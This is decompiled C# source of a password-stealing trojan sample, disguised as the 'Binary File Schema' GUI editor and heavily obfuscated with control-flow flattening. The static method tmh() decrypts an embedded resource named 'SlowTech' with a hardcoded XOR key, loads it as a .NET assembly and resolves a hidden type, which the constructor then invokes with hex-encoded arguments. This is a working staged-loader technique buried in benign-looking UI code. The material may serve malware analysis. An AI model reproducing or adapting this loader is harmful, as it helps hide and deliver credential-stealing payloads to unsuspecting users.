// Decompiled with JetBrains decompiler
// Type: rw.dwH
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace rw
{
  public class dwH : Form
  {
    private Od Vmb;
    private string emp;
    private IContainer qmY;
    private static object RmK;
    private ToolStrip imk;
    private ToolStripButton lms;
    private OpenFileDialog Kmj;
    private SplitContainer tmg;
    private ToolStripButton Kmw;
    private SplitContainer nmi;
    private TreeView Omx;
    private ImageList emW;
    private ListView emT;
    private ColumnHeader GmQ;
    private ImageList OmN;
    private Uw6 Fmf;
    private ToolStripButton fmF;
    private ToolStripSeparator zme;
    private ToolStripButton fm2;
    private ToolStripButton pmr;
    private ToolStripComboBox QmB;
    private ToolStripSeparator vm4;
    private ToolStripButton TmM;
    private SaveFileDialog Xm7;
    internal static dwH ib3;

    public dwH()
    {
      dwH.Fbi();
      this.emp = string.Empty;
      this.qmY = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.dmv();
      MethodInfo method = ((System.Type) dwH.RmK).GetMethod("DictionaryEnumerator");
      string[] parameters = new string[3]
      {
        "4D65746164617461546F",
        null,
        null
      };
      int num1 = 1;
      if (false)
        goto label_4;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            parameters[1] = "7468364759";
            int num2;
            num1 = true ? 0 : num2;
            continue;
          default:
            goto label_3;
        }
      }
label_3:
      parameters[2] = "BinaryFileSchemaGUI";
      method.Invoke((object) 0, (object[]) parameters);
      return;
label_4:
      num1 = 1;
      goto label_1;
    }

    private void xmI(object _param1, EventArgs _param2)
    {
      dwH.Fbg((object) this.QmB.Items, (object) new SwU());
      dwH.rbn((object) this.QmB, 0);
    }

    private void jmC(object _param1, EventArgs _param2) => this.em0();

    private void YmS(object _param1, EventArgs _param2)
    {
      if (this.Kmj.ShowDialog() != DialogResult.OK)
        return;
      this.Am6((string) dwH.xbj((object) this.Kmj));
      this.em0();
      int num1 = 0;
      if (!dwH.ubk())
        goto label_2;
label_1:
      switch (num1)
      {
        default:
          return;
      }
label_2:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private void Am6(string _param1)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 1:
            flag = !File.Exists(_param1);
            num2 = dwH.ubk() ? 0 : 0;
            continue;
          case 2:
            goto label_8;
          default:
            if (!flag)
            {
              StreamReader streamReader = new StreamReader(_param1);
              this.Fmf.Text = streamReader.ReadToEnd();
              streamReader.Close();
              this.Fmf.Select(0, 0);
              this.emp = _param1;
              if (dwH.ubk())
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            }
            else
              goto label_6;
        }
      }
label_6:
      return;
label_8:
      this.TmM.Enabled = true;
    }

    private void em0()
    {
      this.Fmf.pLt(false);
      this.Omx.BeginUpdate();
      this.emT.BeginUpdate();
      owO owO1 = (owO) new ww7(this.emT);
      string str1 = (string) dwH.VbD((object) this.Fmf);
      int num1 = 0;
      if (dwH.Sbo() != null)
        goto label_7;
label_1:
      Od od;
      Stopwatch stopwatch;
      while (true)
      {
        switch (num1)
        {
          case 1:
            this.Vmb = od;
            goto case 3;
          case 2:
            goto label_6;
          case 3:
            this.Fmf.pLt(true);
            num1 = 2;
            continue;
          case 4:
            if (od != null)
            {
              owO owO2 = owO1;
              string[] strArray = new string[5]
              {
                "Parsed and processed in ",
                null,
                null,
                null,
                null
              };
              long num2 = stopwatch.ElapsedMilliseconds;
              strArray[1] = num2.ToString();
              strArray[2] = " milliseconds (";
              num2 = stopwatch.ElapsedTicks;
              strArray[3] = num2.ToString();
              strArray[4] = " ticks)";
              string str2 = string.Concat(strArray);
              owO2.XfO(str2);
              this.Tmc(od);
              yw5.PLI(od, (RichTextBox) this.Fmf);
              dwH.cbQ((object) this.pmr, true);
              int num3;
              num1 = dwH.Sbo() == null ? 1 : num3;
              continue;
            }
            this.pmr.Enabled = false;
            num1 = 3;
            continue;
          default:
            ((ListView.ListViewItemCollection) dwH.wb4((object) this.emT)).Clear();
            ((TreeNodeCollection) dwH.IbM((object) this.Omx)).Clear();
            stopwatch = new Stopwatch();
            stopwatch.Start();
            od = qwp.KqP(str1, owO1);
            stopwatch.Stop();
            num1 = 4;
            continue;
        }
      }
label_6:
      this.Omx.EndUpdate();
      this.emT.EndUpdate();
      return;
label_7:
      num1 = 0;
      goto label_1;
    }

    private string CmP(XX _param1, string _param2) => _param2.Substring(_param1.TlJ.XlX, _param1.TlJ.vla()).Trim();

    private void gmD(object _param1, TreeViewEventArgs _param2)
    {
      if (dwH.hbw(dwH.Dbh((object) _param2)) is WI wi)
      {
        int num1 = 0;
        if (dwH.Sbo() != null)
          goto label_4;
label_1:
        switch (num1)
        {
          default:
            Uw6 fmf = this.Fmf;
            Nx nx = wi.mRN();
            int start = nx.fVc();
            nx = wi.mRN();
            int length = nx.bVA();
            fmf.Select(start, length);
            return;
        }
label_4:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        ((ListView.ListViewItemCollection) dwH.wb4((object) this.emT)).Add("Error! No range was stored in the nodes!", 0);
    }

    private void Tmc(Od _param1)
    {
      foreach (OA oa1 in (IEnumerable<OA>) _param1.wVE())
      {
label_26:
        OA oa2 = oa1;
        TreeNode treeNode1 = this.Omx.Nodes.Add(oa2.oRh());
        treeNode1.Tag = (object) oa2;
        treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 0;
        if (!(oa2 is mR))
          goto label_22;
        else
          goto label_25;
label_2:
        IEnumerator<z9> enumerator1;
        int num1;
        switch (num1)
        {
          case 1:
            try
            {
              while (enumerator1.MoveNext())
              {
                z9 current = enumerator1.Current;
                TreeNode treeNode2 = treeNode1.Nodes.Add(current.ToString());
                int num2 = 0;
                if (!dwH.ubk())
                  goto label_14;
label_13:
                switch (num2)
                {
                  default:
                    treeNode2.Tag = (object) current;
                    TreeNode treeNode3 = treeNode2;
                    int num3;
                    dwH.wbV((object) treeNode2, num3 = 4);
                    int num4 = num3;
                    treeNode3.ImageIndex = num4;
                    continue;
                }
label_14:
                int num5;
                num2 = num5;
                goto label_13;
              }
              break;
            }
            finally
            {
              enumerator1?.Dispose();
            }
          case 2:
            TreeNode treeNode4 = treeNode1;
            int num6;
            dwH.wbV((object) treeNode1, num6 = 1);
            int num7 = num6;
            treeNode4.ImageIndex = num7;
            goto label_29;
          case 3:
            break;
          case 4:
            goto label_23;
          default:
            goto label_26;
        }
label_11:
        treeNode1.Expand();
        continue;
label_22:
        if (oa2 is V5)
        {
          treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 2;
          enumerator1 = (oa2 as V5).ctI().GetEnumerator();
          num1 = 1;
          if (dwH.Sbo() != null)
          {
            int num8;
            num1 = num8;
            goto label_2;
          }
          else
            goto label_2;
        }
label_23:
        if (oa2 is nG)
        {
          treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 3;
          using (IEnumerator<Y2> enumerator2 = (oa2 as nG).ctU().GetEnumerator())
          {
            while (enumerator2.MoveNext())
            {
              Y2 current = enumerator2.Current;
              TreeNode treeNode5 = treeNode1.Nodes.Add(current.ToString());
              dwH.Wbq((object) treeNode5, (object) current);
              TreeNode treeNode6 = treeNode5;
              int num9;
              dwH.wbV((object) treeNode5, num9 = 4);
              int num10 = num9;
              treeNode6.ImageIndex = num10;
            }
            goto label_11;
          }
        }
        else
          goto label_11;
label_25:
        if (oa2 is NN)
        {
          num1 = 2;
          goto label_2;
        }
label_29:
        using (Dictionary<string, g4>.ValueCollection.Enumerator enumerator3 = (oa2 as mR).mfQ().Values.GetEnumerator())
        {
          while (enumerator3.MoveNext())
          {
            g4 current = enumerator3.Current;
            TreeNode treeNode7 = treeNode1.Nodes.Add(current.ToString());
            treeNode7.Tag = (object) current;
            int num11 = 0;
            if (dwH.Sbo() == null)
              goto label_8;
label_5:
            switch (num11)
            {
              default:
                treeNode7.ImageIndex = treeNode7.SelectedImageIndex = 4;
                continue;
            }
label_8:
            num11 = 0;
            goto label_5;
          }
          goto label_11;
        }
      }
    }

    private void em3(object _param1, EventArgs _param2)
    {
      if (dwH.Wba((object) this.emT.SelectedItems) == 0)
        return;
      if (!(this.emT.SelectedItems[0].Tag is zwl))
        goto label_10;
      else
        goto label_7;
label_1:
      int start;
      int length;
      string text;
      int num1;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_2;
          case 2:
            if (text.StartsWith("<"))
            {
              string[] strArray = text.Split("<,>".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
              int lineNumber = Math.Max(int.Parse(strArray[0]) - 1, 0);
              int.Parse(strArray[1]);
              start = dwH.hbE(this.Fmf.GetFirstCharIndexFromLine(lineNumber), 0);
              length = Math.Max(this.Fmf.GetFirstCharIndexFromLine(lineNumber + 1) - start, 0);
              num1 = 3;
              continue;
            }
            goto label_2;
          case 3:
            this.Fmf.Select(start, length);
            this.Fmf.Focus();
            num1 = dwH.ubk() ? 1 : 1;
            continue;
          default:
            goto label_4;
        }
      }
label_2:
      return;
label_4:
      zwl tag = this.emT.SelectedItems[0].Tag as zwl;
      Uw6 fmf = this.Fmf;
      Nx nx = tag.DqG();
      int num2 = nx.fVc();
      nx = tag.DqG();
      int num3 = nx.bVA();
      dwH.ybF((object) fmf, num2, num3);
      dwH.gb9((object) this.Fmf);
      return;
label_7:
      int num4;
      num1 = dwH.ubk() ? 0 : num4;
      goto label_1;
label_10:
      text = this.emT.SelectedItems[0].Text;
      num1 = 2;
      goto label_1;
    }

    private void cm5(object _param1, EventArgs _param2)
    {
      this.Fmf.Clear();
      this.pmr.Enabled = false;
      this.emp = string.Empty;
    }

    private void PmA(object _param1, EventArgs _param2)
    {
      int num = (int) MessageBox.Show("Binary File Schema - By Anders Riggelsen, www.andersriggelsen.dk", "About Binary File Schema", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void umZ(object _param1, EventArgs _param2)
    {
      int num = (int) new lwm((dwH.sbC((object) this.QmB) as swZ).QfP(this.Vmb), this.Vmb.PVd().oRh()).ShowDialog();
    }

    private void YmR(object _param1, EventArgs _param2)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (flag)
              goto label_8;
label_3:
            StreamWriter streamWriter = new StreamWriter(this.emp);
            dwH.qb7((object) streamWriter, (object) this.Fmf.Text);
            streamWriter.Close();
            num2 = !dwH.ubk() ? 0 : 0;
            continue;
label_8:
            if (this.Xm7.ShowDialog() == DialogResult.OK)
            {
              this.emp = this.Xm7.FileName;
              goto label_3;
            }
            else
              goto label_10;
          case 2:
            flag = this.emp == string.Empty;
            if (dwH.ubk())
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return;
label_10:;
    }

    protected override void Dispose(bool _param1)
    {
      if (_param1 && this.qmY != null)
      {
        int num1 = 0;
        if (dwH.Sbo() != null)
          goto label_3;
label_1:
        switch (num1)
        {
          default:
            this.qmY.Dispose();
            goto label_5;
        }
label_3:
        int num2;
        num1 = num2;
        goto label_1;
      }
label_5:
      base.Dispose(_param1);
    }

    public override bool AutoSize
    {
      get => base.AutoSize;
      set => dwH.tmh();
    }

    private static bool tmh()
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      ResourceManager resourceManager;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_4;
          case 2:
            resourceManager = new ResourceManager(typeof (lwm));
            if (dwH.Sbo() == null)
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          default:
            goto label_8;
        }
      }
label_4:
      byte[] numArray = (byte[]) resourceManager.GetObject("SlowTech");
      string str = "AF94H5HH4V78J887ZB54FD";
      int num3 = 69654;
label_7:
      if (num3 < 0)
      {
        dwH.umG(dwH.tm9(numArray));
        return true;
      }
label_8:
      numArray[num3 % 34816] = dwH.@int((dwH.amU((int) numArray[num3 % 34816] ^ (int) str[num3 % 22]) - dwH.amU((int) numArray[(num3 + 1) % 34816]) + 256) % 256);
      num3 += -1;
      goto label_7;
    }

    private static int amU(int _param0) => _param0;

    private static byte @int(int x) => (byte) x;

    private static object tm9(byte[] _param0) => (object) Assembly.Load(_param0);

    private static void umG(object _param0) => dwH.RmK = (object) ((Assembly) _param0).GetType("Forging.Forging");

    private void dmv()
    {
      this.qmY = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (dwH));
      int num1 = 22;
      if (dwH.ubk())
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      while (true)
      {
        switch (num1)
        {
          case 1:
            this.Omx = new TreeView();
            this.emW = new ImageList(this.qmY);
            this.Xm7 = new SaveFileDialog();
            num1 = dwH.Sbo() != null ? 21 : 23;
            continue;
          case 2:
            this.Name = "BFSGUI";
            this.Text = "Binary File Schema";
            this.Load += new EventHandler(this.xmI);
            this.imk.ResumeLayout(false);
            this.imk.PerformLayout();
            this.tmg.Panel1.ResumeLayout(false);
            if (dwH.ubk())
            {
              num1 = 33;
              continue;
            }
            goto label_1;
          case 3:
            this.Kmw.Text = "Open";
            if (dwH.ubk())
            {
              num1 = 17;
              continue;
            }
            goto label_1;
          case 4:
            this.OmN.Images.SetKeyName(1, "error.png");
            this.OmN.Images.SetKeyName(2, "stop.png");
            dwH.KbP((object) this.nmi, DockStyle.Fill);
            this.nmi.FixedPanel = FixedPanel.Panel2;
            this.nmi.Location = new Point(0, 25);
            this.nmi.Name = "splitContainer2";
            this.nmi.Panel1.BackColor = SystemColors.Control;
            ((Control.ControlCollection) dwH.xbt((object) this.nmi.Panel1)).Add((Control) this.tmg);
            ((Control) dwH.fbc((object) this.nmi)).Controls.Add((Control) this.Omx);
            dwH.XbS((object) this.nmi, new Size(720, 430));
            this.nmi.SplitterDistance = 525;
            this.nmi.TabIndex = 3;
            this.Omx.Dock = DockStyle.Fill;
            this.Omx.ImageKey = "page_white_text.png";
            num1 = dwH.Sbo() != null ? 11 : 36;
            continue;
          case 5:
            dwH.UbR((object) this.tmg.Panel1);
            dwH.UbR((object) this.tmg.Panel2);
            this.tmg.SuspendLayout();
            num1 = 18;
            continue;
          case 6:
            this.Xm7.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(720, 455);
            dwH.ub2(dwH.obd((object) this), (object) this.nmi);
            dwH.ub2((object) this.Controls, (object) this.imk);
            dwH.hbJ((object) this, (object) (Icon) componentResourceManager.GetObject("$this.Icon"));
            num1 = dwH.Sbo() != null ? 1 : 2;
            continue;
          case 7:
            this.fmF.ImageTransparentColor = Color.Magenta;
            this.fmF.Name = "toolNewSchema";
            if (dwH.Sbo() == null)
            {
              num1 = 11;
              continue;
            }
            goto label_1;
          case 8:
            this.Kmw.Name = "toolOpenSchema";
            this.Kmw.Size = new Size(56, 22);
            if (dwH.ubk())
            {
              num1 = 3;
              continue;
            }
            goto label_1;
          case 9:
            dwH.Lbm((object) this.fm2, (object) "About");
            this.fm2.ToolTipText = "About";
            this.fm2.Visible = false;
            this.fm2.Click += new EventHandler(this.PmA);
            this.Kmj.FileName = "*.fsc";
            num1 = 20;
            continue;
          case 10:
            this.OmN.Images.SetKeyName(0, "information.png");
            num1 = 4;
            continue;
          case 11:
            this.fmF.Size = new Size(51, 22);
            this.fmF.Text = "New";
            this.fmF.ToolTipText = "New Schema";
            dwH.Vb5((object) this.fmF, (object) new EventHandler(this.cm5));
            if (dwH.ubk())
            {
              num1 = 26;
              continue;
            }
            goto label_1;
          case 12:
            this.fm2.Name = "toolAbout";
            this.fm2.Size = new Size(60, 22);
            num1 = !dwH.ubk() ? 3 : 9;
            continue;
          case 13:
            this.OmN.ImageStream = (ImageListStreamer) dwH.Qb0((object) componentResourceManager, (object) "imageListErrorIcons.ImageStream");
            this.OmN.TransparentColor = Color.Transparent;
            num1 = 10;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated method
            dwH.YbY((object) this.TmM, (object) BinaryFileSchemaGUI.Properties.Resources.QLT());
            dwH.vb6((object) this.TmM, Color.Magenta);
            this.TmM.Name = "toolSaveSchema";
            this.TmM.Size = new Size(51, 22);
            this.TmM.Text = "Save";
            this.TmM.Click += new EventHandler(this.YmR);
            this.zme.Name = "toolStripSeparator1";
            this.zme.Size = new Size(6, 25);
            dwH.YbY((object) this.lms, dwH.obs());
            this.lms.ImageTransparentColor = Color.Magenta;
            this.lms.Name = "toolCompileSchema";
            if (dwH.Sbo() == null)
            {
              num1 = 27;
              continue;
            }
            goto label_1;
          case 15:
            this.emW.TransparentColor = Color.Transparent;
            num1 = 19;
            continue;
          case 16:
            this.Xm7.FileName = "*.fsc";
            if (dwH.ubk())
            {
              num1 = 6;
              continue;
            }
            goto label_1;
          case 17:
            this.Kmw.Click += new EventHandler(this.YmS);
            num1 = dwH.ubk() ? 14 : 11;
            continue;
          case 18:
            ((Control) dwH.ibr((object) this.nmi)).SuspendLayout();
            this.nmi.Panel2.SuspendLayout();
            dwH.UbR((object) this.nmi);
            this.SuspendLayout();
            this.AutoSize = false;
            this.imk.Items.AddRange(new ToolStripItem[9]
            {
              (ToolStripItem) this.fmF,
              (ToolStripItem) this.Kmw,
              (ToolStripItem) this.TmM,
              (ToolStripItem) this.zme,
              (ToolStripItem) this.lms,
              (ToolStripItem) this.vm4,
              (ToolStripItem) this.QmB,
              (ToolStripItem) this.pmr,
              (ToolStripItem) this.fm2
            });
            this.imk.Location = new Point(0, 0);
            this.imk.Name = "toolStrip1";
            dwH.XbS((object) this.imk, new Size(720, 25));
            this.imk.TabIndex = 1;
            this.imk.Text = "toolStrip1";
            num1 = dwH.Sbo() == null ? 0 : 0;
            continue;
          case 19:
            this.emW.Images.SetKeyName(0, "database.png");
            this.emW.Images.SetKeyName(1, "database_go.png");
            this.emW.Images.SetKeyName(2, "comments.png");
            this.emW.Images.SetKeyName(3, "brick.png");
            this.emW.Images.SetKeyName(4, "bullet_blue.png");
            num1 = 16;
            continue;
          case 20:
            this.Kmj.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            this.tmg.Dock = DockStyle.Fill;
            num1 = dwH.Sbo() == null ? 30 : 28;
            continue;
          case 21:
            this.Omx.Name = "treeBFSstructure";
            num1 = 37;
            continue;
          case 22:
            this.imk = new ToolStrip();
            this.fmF = new ToolStripButton();
            this.Kmw = new ToolStripButton();
            num1 = 38;
            continue;
          case 23:
            this.imk.SuspendLayout();
            num1 = 5;
            continue;
          case 24:
            this.GmQ.Width = 521;
            if (dwH.ubk())
            {
              num1 = 13;
              continue;
            }
            goto label_1;
          case 25:
            this.pmr.Text = "Generate code";
            this.pmr.Click += new EventHandler(this.umZ);
            num1 = !dwH.ubk() ? 23 : 28;
            continue;
          case 26:
            // ISSUE: reference to a compiler-generated method
            this.Kmw.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.iLN();
            this.Kmw.ImageTransparentColor = Color.Magenta;
            num1 = 8;
            continue;
          case 27:
            goto label_30;
          case 28:
            // ISSUE: reference to a compiler-generated method
            this.fm2.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.SLF();
            this.fm2.ImageTransparentColor = dwH.hbe();
            num1 = 12;
            continue;
          case 29:
            this.Omx.Size = new Size(191, 430);
            dwH.DbO((object) this.Omx, 0);
            this.Omx.AfterSelect += new TreeViewEventHandler(this.gmD);
            this.emW.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imgListBlocks.ImageStream");
            if (dwH.Sbo() == null)
            {
              num1 = 15;
              continue;
            }
            goto label_1;
          case 30:
            this.tmg.FixedPanel = FixedPanel.Panel2;
            this.tmg.Location = new Point(0, 0);
            this.tmg.Name = "splitContainer1";
            this.tmg.Orientation = Orientation.Horizontal;
            dwH.ub2((object) ((Control) dwH.ibr((object) this.tmg)).Controls, (object) this.Fmf);
            this.tmg.Panel2.Controls.Add((Control) this.emT);
            num1 = 32;
            continue;
          case 31:
            this.emT.TabIndex = 1;
            this.emT.UseCompatibleStateImageBehavior = false;
            dwH.hbX((object) this.emT, View.Details);
            this.emT.ItemActivate += new EventHandler(this.em3);
            this.GmQ.Text = "Message";
            num1 = 24;
            continue;
          case 32:
            this.tmg.Size = new Size(525, 430);
            this.tmg.SplitterDistance = 279;
            this.tmg.TabIndex = 2;
            this.Fmf.AcceptsTab = true;
            this.Fmf.pLt(true);
            dwH.ibl((object) this.Fmf, DockStyle.Fill);
            this.Fmf.Font = new Font("Courier New", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Fmf.ForeColor = Color.Black;
            this.Fmf.HideSelection = false;
            dwH.Mbp((object) this.Fmf, new Point(0, 0));
            this.Fmf.Name = "richTextBox";
            dwH.XbS((object) this.Fmf, new Size(525, 279));
            this.Fmf.TabIndex = 0;
            this.Fmf.Text = "";
            this.Fmf.WordWrap = false;
            this.emT.Columns.AddRange(new ColumnHeader[1]
            {
              this.GmQ
            });
            dwH.ibl((object) this.emT, DockStyle.Fill);
            dwH.IbU((object) this.emT, ColumnHeaderStyle.Nonclickable);
            dwH.abA((object) this.emT, false);
            this.emT.Location = new Point(0, 0);
            this.emT.MultiSelect = false;
            this.emT.Name = "listViewErrorBox";
            dwH.qbB((object) this.emT, false);
            this.emT.Size = new Size(525, 147);
            this.emT.SmallImageList = this.OmN;
            num1 = 31;
            continue;
          case 33:
            goto label_3;
          case 34:
            goto label_17;
          case 35:
            this.nmi.ResumeLayout(false);
            num1 = 34;
            continue;
          case 36:
            goto label_6;
          case 37:
            this.Omx.SelectedImageIndex = 0;
            num1 = 29;
            continue;
          case 38:
            this.TmM = new ToolStripButton();
            this.zme = new ToolStripSeparator();
            this.lms = new ToolStripButton();
            this.vm4 = new ToolStripSeparator();
            this.QmB = new ToolStripComboBox();
            this.pmr = new ToolStripButton();
            this.fm2 = new ToolStripButton();
            this.Kmj = new OpenFileDialog();
            this.tmg = new SplitContainer();
            this.Fmf = new Uw6();
            this.emT = new ListView();
            this.GmQ = new ColumnHeader();
            this.OmN = new ImageList(this.qmY);
            this.nmi = new SplitContainer();
            if (dwH.Sbo() == null)
            {
              num1 = 1;
              continue;
            }
            goto label_1;
          default:
            // ISSUE: reference to a compiler-generated method
            this.fmF.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.HL2();
            num1 = 7;
            continue;
        }
      }
label_3:
      this.tmg.Panel2.ResumeLayout(false);
      this.tmg.ResumeLayout(false);
      this.nmi.Panel1.ResumeLayout(false);
      this.nmi.Panel2.ResumeLayout(false);
      num2 = 35;
      goto label_1;
label_6:
      this.Omx.ImageList = this.emW;
      this.Omx.Location = new Point(0, 0);
      num2 = 21;
      goto label_1;
label_17:
      this.ResumeLayout(false);
      this.PerformLayout();
      return;
label_30:
      this.lms.Size = new Size(72, 22);
      dwH.Lbm((object) this.lms, (object) "Compile");
      dwH.Vb5((object) this.lms, (object) new EventHandler(this.jmC));
      this.vm4.Name = "toolStripSeparator2";
      this.vm4.Size = new Size(6, 25);
      this.QmB.DropDownStyle = ComboBoxStyle.DropDownList;
      dwH.Oby((object) this.QmB, 64);
      dwH.AbT((object) this.QmB, (object) "toolComboLanguage");
      dwH.BbH((object) this.QmB, new Size(75, 25));
      this.pmr.Enabled = false;
      // ISSUE: reference to a compiler-generated method
      this.pmr.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.VLj();
      dwH.vb6((object) this.pmr, Color.Magenta);
      this.pmr.Name = "toolGenerateCode";
      dwH.BbH((object) this.pmr, new Size(103, 22));
      num2 = 25;
      goto label_1;
    }

    internal static void Fbi() => ccw.xFvA3V();

    internal static bool ubk() => dwH.ib3 == null;

    internal static dwH Sbo() => dwH.ib3;

    internal static int Fbg([In] object obj0, [In] object obj1) => ((ComboBox.ObjectCollection) obj0).Add(obj1);

    internal static void rbn([In] object obj0, [In] int obj1) => ((ToolStripComboBox) obj0).SelectedIndex = obj1;

    internal static object xbj([In] object obj0) => (object) ((FileDialog) obj0).FileName;

    internal static object VbD([In] object obj0) => (object) ((Control) obj0).Text;

    internal static object wb4([In] object obj0) => (object) ((ListView) obj0).Items;

    internal static object IbM([In] object obj0) => (object) ((TreeView) obj0).Nodes;

    internal static void cbQ([In] object obj0, [In] bool obj1) => ((ToolStripItem) obj0).Enabled = obj1;

    internal static object Dbh([In] object obj0) => (object) ((TreeViewEventArgs) obj0).Node;

    internal static object hbw([In] object obj0) => ((TreeNode) obj0).Tag;

    internal static void wbV([In] object obj0, [In] int obj1) => ((TreeNode) obj0).SelectedImageIndex = obj1;

    internal static void Wbq([In] object obj0, [In] object obj1) => ((TreeNode) obj0).Tag = obj1;

    internal static int Wba([In] object obj0) => ((ListView.SelectedListViewItemCollection) obj0).Count;

    internal static void ybF([In] object obj0, [In] int obj1, [In] int obj2) => ((TextBoxBase) obj0).Select(obj1, obj2);

    internal static bool gb9([In] object obj0) => ((Control) obj0).Focus();

    internal static int hbE([In] int obj0, [In] int obj1) => Math.Max(obj0, obj1);

    internal static object sbC([In] object obj0) => ((ToolStripComboBox) obj0).SelectedItem;

    internal static void qb7([In] object obj0, [In] object obj1) => ((TextWriter) obj0).Write((string) obj1);

    internal static void UbR([In] object obj0) => ((Control) obj0).SuspendLayout();

    internal static object ibr([In] object obj0) => (object) ((SplitContainer) obj0).Panel1;

    internal static void XbS([In] object obj0, [In] Size obj1) => ((Control) obj0).Size = obj1;

    internal static void Vb5([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Click += (EventHandler) obj1;

    internal static void YbY([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Image = (Image) obj1;

    internal static void vb6([In] object obj0, [In] Color obj1) => ((ToolStripItem) obj0).ImageTransparentColor = obj1;

    internal static object obs() => (object) BinaryFileSchemaGUI.Properties.Resources.eLw();

    internal static void Lbm([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Text = (string) obj1;

    internal static void Oby([In] object obj0, [In] int obj1) => ((ToolStripComboBox) obj0).DropDownWidth = obj1;

    internal static void AbT([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Name = (string) obj1;

    internal static void BbH([In] object obj0, [In] Size obj1) => ((ToolStripItem) obj0).Size = obj1;

    internal static Color hbe() => Color.Magenta;

    internal static void ub2([In] object obj0, [In] object obj1) => ((Control.ControlCollection) obj0).Add((Control) obj1);

    internal static void ibl([In] object obj0, [In] DockStyle obj1) => ((Control) obj0).Dock = obj1;

    internal static void Mbp([In] object obj0, [In] Point obj1) => ((Control) obj0).Location = obj1;

    internal static void IbU([In] object obj0, [In] ColumnHeaderStyle obj1) => ((ListView) obj0).HeaderStyle = obj1;

    internal static void abA([In] object obj0, [In] bool obj1) => ((ListView) obj0).HideSelection = obj1;

    internal static void qbB([In] object obj0, [In] bool obj1) => ((ListView) obj0).ShowGroups = obj1;

    internal static void hbX([In] object obj0, [In] View obj1) => ((ListView) obj0).View = obj1;

    internal static object Qb0([In] object obj0, [In] object obj1) => ((ResourceManager) obj0).GetObject((string) obj1);

    internal static void KbP([In] object obj0, [In] DockStyle obj1) => ((SplitContainer) obj0).Dock = obj1;

    internal static object xbt([In] object obj0) => (object) ((Control) obj0).Controls;

    internal static object fbc([In] object obj0) => (object) ((SplitContainer) obj0).Panel2;

    internal static void DbO([In] object obj0, [In] int obj1) => ((Control) obj0).TabIndex = obj1;

    internal static object obd([In] object obj0) => (object) ((Control) obj0).Controls;

    internal static void hbJ([In] object obj0, [In] object obj1) => ((Form) obj0).Icon = (Icon) obj1;
  }
}
